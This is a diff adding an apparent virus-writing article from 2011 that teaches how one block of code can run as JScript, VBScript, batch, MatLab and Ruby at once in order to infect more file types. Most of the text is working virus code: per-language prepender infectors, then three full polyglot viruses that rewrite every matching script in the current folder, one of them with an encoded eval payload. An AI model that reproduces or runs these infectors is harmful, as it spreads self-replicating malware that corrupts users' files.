@@ -1,0 +1,455 @@
+
+
+             **********************************************
+                Cross Script Infection using the same code
+                                  by Second Part To Hell
+             **********************************************
+
+
+
+  Index:
+  ******
+
+  1) Introduction
+
+  2) Infection strategy
+  2.1) JScript + BATch
+  2.2) JScript + VBScript
+  2.3) JScript + VBScript + BATch
+  2.4) JScript + VBScript + BATch + MatLab
+  2.5) Ruby + JScript
+  2.6) Ruby + BATch + Matlab
+
+  3) Code snippets
+  3.1) JScript code
+  3.2) VBScript code
+  3.3) BATch code
+  3.4) MatLab code
+  3.5) Ruby code
+
+  4) Full infectors
+  4.1) JS/VBS/BATch/MatLab infector
+  4.2) Ruby/JScript infector
+  4.3) Ruby/BATch/MatLab infector
+
+  5) Conclusion
+
+
+
+
+
+
+
+
+
+
+  1) Introduction
+
+     Cross infection gives us the possibility to reach more targets, thus
+     spread faster. There are two ways how it can be done: Adjusting the code
+     for each platform, or using a code that can run natively on each
+     platfoms.
+
+     In this text I show some ways to target different scripting languages
+     by using the same code. The advantage is that one doesnt need to adjust
+     the code for every new target, thus the infection is much easier, smaller
+     and more beautiful :-)
+
+     I show the principial idea first, and later the actual code; if you want
+     to write such codes, I suggest you to write down such plans, this helps
+     alot :-)
+
+
+
+
+
+
+
+
+  2) Infection strategy
+
+  2.1) JScript + BATch
+
+       In 2003, I've written an article "Cross Infection in JavaScript" in
+       rRlf#4, which shows a trick to infect a JS and BAT files with the same
+       code. The code could look like this:
+
+[--------------------[JS+BAT]--------------------]
+/*
+goto bat
+*/
+   [JScript code]
+/*
+:bat
+   [BATch code]
+*/
+[--------------------[JS+BAT]--------------------]
+
+       It takes advantage of the forgiving BAT interpreter - the interpreter
+       just ignores lines with errors.
+
+
+
+
+
+  2.2) JScript + VBScript
+
+       In 2005, roy g biv published an article "Cross-scripting attacks" in
+       rRlf#6, which used a new trick to execute the same code in JScript and
+       VBScript:
+
+[--------------------[JS+VBS]--------------------]
+rem=1; [JScript code] /*
+[VBS code]:rem*/
+[--------------------[JS+VBS]--------------------]
+
+       It uses the different property of "REM" - for a VBS interpreter, it is
+       a simple comment, and the rest of the line will be ignored. For the
+       JScript interpreter, it is a simple variable definition.
+
+
+
+
+
+  2.3) JScript + VBScript + BATch
+
+       We can combine the two old techniques, add a small new trick and we are
+       ready. One VBScript property makes it harder: '%' is an invalid
+       character for the VBS interpreter, but need to be used in BATch.
+       The working solution could look like this:
+
+[------------------[JS+VBS+BAT]------------------]
+rem=1; [JScript code] /*
+[VBS code]
+'&[BAT code]&*/
+cls=""
+[------------------[JS+VBS+BAT]------------------]
+
+       Again we use the fact that "rem" is a comment for VBScript (and BATch),
+       and that the BATch interpreter ignores errors (such as the [VBS code],
+       We also use the "&" character to combine BATch lines to single lines.
+       The first letter of the 3rd line is another comment-instruction for
+       VBScript, thus this line will be ignored.
+
+       The last line is just a small addon, it is a valid variable definition
+       in JS and VBS, and clears the screen in BATch.
+
+
+
+
+
+  2.4) JScript + VBScript + BATch + MatLab
+
+       I have MatLab here, so why not add this to the target list, too? :-)
+       MatLab's single-line comments are "%" (there is a multiline comment
+       %{ %}, but this has to be the first instruction in a line, so it cant
+       be used here).
+
+       MatLab let's see the template:
+
+[------------------[JS+VBS+BAT+ML]------------------]
+rem=4%2; [JScript code] /*
+'';[MatLab code]; if 0
+[VBS code]
+'';end;%%&[BAT code]&*/
+[------------------[JS+VBS+BAT+ML]------------------]
+
+       First line: "rem" is a comment for VBS+BAT; "rem=4%" is a valid variable
+       definition for MatLab followed by a single-line comment (thus ignoring
+       the rest of the line). "rem=4%2;" is a valid variable definition for
+       JScript, using the modulo operation.
+
+       Second line starts with a '', which indicates a single-line comment for
+       VBS and a valid empty string for MatLab. In the end of that line there
+       is an condition which is always false, so until the branch is closed
+       (in line 4), the content in between (VBS code) will be ignored by
+       MatLab.
+
+       The 4th line starts with the '' VBS comment again, and ends the MatLab
+       if-branch from the 2nd line; then there is a Matlab comment-indicator
+       "%". It is written twice, as the "%" is a indicator for a variable in
+       BATch - and would cause a fatal error when its not closed. %% is a 
+       valid empty variable, thus the BATch code works.
+
+
+
+
+
+  2.5) Ruby + JScript
+
+       We try Ruby next (for infos about Ruby viruses, see my article 
+       "RUBY Virus Writing Guide" in 29a#8). It's far more restrict due to
+       several counter-properties:
+
+       -> The multi-line comment needs to be in an empty line, thus can't be
+          used as other interpreters will show errors.
+       -> The single-line comment '#' is an invalid character in JScript,
+          VBScript and MatLab.
+       -> The JScript multi-line comment '/* */' is recognized as an incomplete
+          regular expression by Ruby interpreters.
+       -> JScript single-line '//' comment is invalid MatLab
+       -> Ruby's instruction parser is more restrictive than MatLab's or
+          JScript's one - even in parts that cant be reached in runtime.
+
+       Still with a little trick, one can run a code in both Ruby+JScript.
+
+[------------------[RB+JS]------------------]
+//; [Ruby code]; if nil
+eval('[JScript code*]');//;end
+[------------------[RB+JS]------------------]
+
+       *) The JScript must not contain further ' (chr(39)), just " (chr(34)).
+
+       The trick is: eval is an instruction that executes string-expressions
+       in JScript and Ruby, as the string is not parsed before runtime, it
+       works for both platforms.
+
+       Second trick is: '//' is a non-invalid instruction in Ruby, and a
+       comment in JScript.
+
+
+
+
+
+  2.6) Ruby + BATch + MatLab
+
+       It seems to be not possible to write a virus infecting all together:
+
+            Ruby + (JScript | VBScript) + MatLab
+
+       due to the problems mentioned above. So we can ommit JS/VBS, and infect
+       the remaining targets.
+
+[------------------[RB+BAT+ML]------------------]
+rem 4%2; [Ruby code]; if nil
+eval(char( [ML code*] ));
+%w[];%w[];end;#& [BAT code]
+[------------------[RB+BAT+ML]------------------]
+
+       3rd line "%w[];%w[]" is a comment for MatLab, an non-invalid instruction
+       for BATch (as there are two %'s), and an empty array in Ruby.
+       (could have been "a=4%2;a=4%2", but this is 2 bytes smaller :-) )
+
+
+
+
+
+
+
+
+
+
+  3) Code snippets
+
+  3.1) JScript code
+
+       In the final version, the JScript code is written as a single line,
+       the lines are connected via ";". Here the readable version:
+
+[------------------[JS long]------------------]
+a=new ActiveXObject("scripting.filesystemobject");
+for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext())
+{
+    f=a.getextensionname(e=d.item()).toLowerCase();
+    if(f=="js"||f=="vbs"||f=="bat"||f=="m")
+    try
+    {
+        f=a.getfile(e);
+        g=f.attributes;
+        f.attributes=0;
+        b=a.opentextfile(e).readall();
+        if(b.search("vir")<0)
+        {
+            a.opentextfile(e,2).write(a.opentextfile(WScript.scriptfullname).readall().substr(0,[VIRUS_SIZE])+b);
+        }
+        f.attributes=g;
+    }
+    catch(z){}
+}
+[------------------[JS long]------------------]
+
+       (Big) parts of the code is used from roy g biv's JS/VBS.ACDC
+       (in rRlf#6), however this code is a prepender and his code was an
+       appender.
+
+
+
+
+
+  3.2) VBScript code
+
+       The VBS code is combined to a single line too, using ':'. Here the
+       non-optimized version:
+
+[------------------[VBS long]------------------]
+on error resume next
+set a=createobject("scripting.filesystemobject")
+set d=a.getfolder(".")
+for each e in d.files
+    f=lcase(a.getextensionname(e))
+    if f="js"or f="vbs" or f="bat" or f="m"then
+        f=e.attributes:e.attributes=0
+        b=a.opentextfile(e).readall
+        if instr(b,"vir")=0then
+            a.opentextfile(e,2).write mid(a.opentextfile(wscript.scriptfullname).readall,1,[VIRUS_SIZE])+b
+        end if
+        e.attributes=f
+    end if
+next
+[------------------[VBS long]------------------]
+
+       Again, (big) parts of this code is from roy g biv's JS/VBS.ACDC from
+       rRlf#6, but this one is a prepender and his ACDC is an appender.
+
+
+
+
+
+  3.3) BATch code
+
+       The BATch part is also a single line; the lines are combined using
+       "&" characters. For better understanding, here the long version:
+
+[------------------[BAT long]------------------]
+for %%a in (*.js *.vbs *.bat *.m) do (
+    find "vir" %%a
+    if ERRORLEVEL 1 find "vir"<%0>a
+    copy a /b + %%a /b b
+    move /y b %%a
+)
+del a b
+cls
+[------------------[BAT long]------------------]
+
+       A simple prepender which searchs for the virus-mark "vir" and
+       infects other files using two temp-files (a b).
+
+
+
+
+
+  3.4) MatLab code
+
+       Also the MatLab code is single-lined, using ";". Here the long
+       version:
+
+[------------------[ML long]------------------]
+a=fopen([mfilename '.m']);
+b=[char(fread(a,[VIRUS_SIZE]))]'
+fclose(a);
+c={'*.js','*.vbs','*.bat','*.m'};
+for d=1:length(c)
+    e=dir(c{d});
+    for f=1:length(e)
+        g=fopen(e(f).name,'r+');
+        h=fread(g,'*char')';
+        frewind(g);
+        if isempty(strfind(h,'vir'))
+            fwrite(g,[b h]);
+        end;
+        fclose(g);
+    end;
+end;
+[------------------[ML long]------------------]
+
+         Simple and optimized :)
+
+
+
+
+
+    3.5) Ruby code
+
+         Readable form of the Ruby infector, which's lines are combined
+         with ';' in the actual virus.
+
+[------------------[RB long]------------------]
+a=File.open(__FILE__);
+b=a.read([VIRUS_SIZE]);
+a.close;
+c=Dir.open(Dir.getwd);
+c.each do |d|
+    e=File.extname(d);
+    if File.ftype(d)=="file" && (e==".bat"||e==".m"||e==".rb")
+        f=File.open(d,"r+");
+        g=f.read(File.size(f));
+        if !g.index('vir');
+            f.rewind;
+            f.print b+g;
+        end;
+        f.close;
+    end;
+end;
+c.close;
+[------------------[RB long]------------------]
+
+
+
+
+
+
+
+
+
+
+    4) Full infectors
+
+    4.1) JS/VBS/BATch/MatLab infector
+
+       Now lets see the whole full infector:
+
+[------------------[JS/VBS/BAT/ML]------------------]
+rem=4%2;a=new ActiveXObject("scripting.filesystemobject");for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext()){f=a.getextensionname(e=d.item()).toLowerCase();if(f=="js"||f=="vbs"||f=="bat"||f=="m")try{f=a.getfile(e);g=f.attributes;f.attributes=0;b=a.opentextfile(e).readall();if(b.search("vir")<0)a.opentextfile(e,2).write(a.opentextfile(WScript.scriptfullname).readall().substr(0,1251)+b);f.attributes=g;}catch(z){}}/*
+'';a=fopen([mfilename '.m']);b=[char(fread(a,1251))]';fclose(a);c={'*.js','*.vbs','*.bat','*.m'};for d=1:length(c)e=dir(c{d});for f=1:length(e)g=fopen(e(f).name,'r+');h=fread(g,'*char')';frewind(g);if isempty(strfind(h,'vir'))fwrite(g,[b h]);end;fclose(g);end;end;if 0
+on error resume next:set a=createobject("scripting.filesystemobject"):set d=a.getfolder("."):for each e in d.files:f=lcase(a.getextensionname(e)):if f="js"or f="vbs" or f="bat" or f="m"then:f=e.attributes:e.attributes=0:b=a.opentextfile(e).readall:if instr(b,"vir")=0then a.opentextfile(e,2).write mid(a.opentextfile(wscript.scriptfullname).readall,1,1251)+b:end if:e.attributes=f:end if:next
+'';end;%%&for %%a in (*.js *.vbs *.bat *.m)do (find "vir" %%a&if ERRORLEVEL 1 find "vir"<%0>a&copy a /b + %%a /b b & move /y b %%a)&del a b&cls& */
+
+[------------------[JS/VBS/BAT/ML]------------------]
+
+       The empty last line is a must.
+
+
+
+
+
+    4.2) Ruby/JScript infector
+
+[------------------[RB/JS]------------------]
+//;a=File.open(__FILE__);b=a.read(703);a.close;c=Dir.open(Dir.getwd);c.each do |d| e=File.extname(d);if File.ftype(d)=="file" && (e==".bat"||e==".m"||e==".rb");f=File.open(d,"r+");g=f.read(File.size(f));if !g.index('vir');f.rewind;f.print b+g;end;f.close;end;end;c.close;if nil
+eval('a=new ActiveXObject("scripting.filesystemobject");for(d=new Enumerator(a.getfolder(".").files);!d.atEnd();d.moveNext()){f=a.getextensionname(e=d.item()).toLowerCase();if(f=="js"||f=="rb")try{f=a.getfile(e);g=f.attributes;f.attributes=0;b=a.opentextfile(e).readall();if(b.search("vir")<0)a.opentextfile(e,2).write(a.opentextfile(WScript.scriptfullname).readall().substr(0,703)+b);f.attributes=g;}catch(z){}}');//;end
+
+[------------------[RB/JS]------------------]
+
+
+
+
+
+    4.3) Ruby/BATch/MatLab infector
+
+[------------------[RB/BAT/ML]------------------]
+rem=4%2;a=File.open(__FILE__);b=a.read(1458);a.close;c=Dir.open(Dir.getwd);c.each do |d| e=File.extname(d);if File.ftype(d)=="file" && (e==".bat"||e==".m"||e==".rb");f=File.open(d,"r+");g=f.read(File.size(f));if !g.index('vir');f.rewind;f.print b+g;end;f.close;end;end;c.close;if nil
+vir=1458;eval(char([97,61,102,111,112,101,110,40,91,109,102,105,108,101,110,97,109,101,32,39,46,109,39,93,41,59,102,111,112,101,110,40,91,109,102,105,108,101,110,97,109,101,32,39,46,109,39,93,41,59,98,61,91,99,104,97,114,40,102,114,101,97,100,40,97,44,118,105,114,41,41,93,39,59,102,99,108,111,115,101,40,97,41,59,99,61,123,39,42,46,118,98,115,39,44,39,42,46,98,97,116,39,44,39,42,46,109,39,44,39,42,46,114,98,39,125,59,102,111,114,32,100,61,49,58,108,101,110,103,116,104,40,99,41,101,61,100,105,114,40,99,123,100,125,41,59,102,111,114,32,102,61,49,58,108,101,110,103,116,104,40,101,41,103,61,102,111,112,101,110,40,101,40,102,41,46,110,97,109,101,44,39,114,43,39,41,59,104,61,102,114,101,97,100,40,103,44,39,42,99,104,97,114,39,41,39,59,102,114,101,119,105,110,100,40,103,41,59,105,102,32,105,115,101,109,112,116,121,40,115,116,114,102,105,110,100,40,104,44,39,118,105,114,39,41,41,102,119,114,105,116,101,40,103,44,91,98,32,104,93,41,59,101,110,100,59,102,99,108,111,115,101,40,103,41,59,101,110,100,59,101,110,100]));
+%w[];%w[];end;#&for %%a in (*.bat *.m *.rb)do (find "vir" %%a&if ERRORLEVEL 1 find "vir"<%0>a&copy a /b + %%a /b b & move /y b %%a)&del a b&cls
+
+[------------------[RB/BAT/ML]------------------]
+
+       
+
+
+
+
+
+
+
+
+    5) Conclusion
+
+       So now we have infectors that can target three or even four different
+       languages, with the same code. Isn't that beautiful? :-)
+
+       Question: What next?
+       Answere: 5, 6, 7, 8 ... languages :-D
+
+
+                                                          Second Part To Hell
+                                                                  August 2011
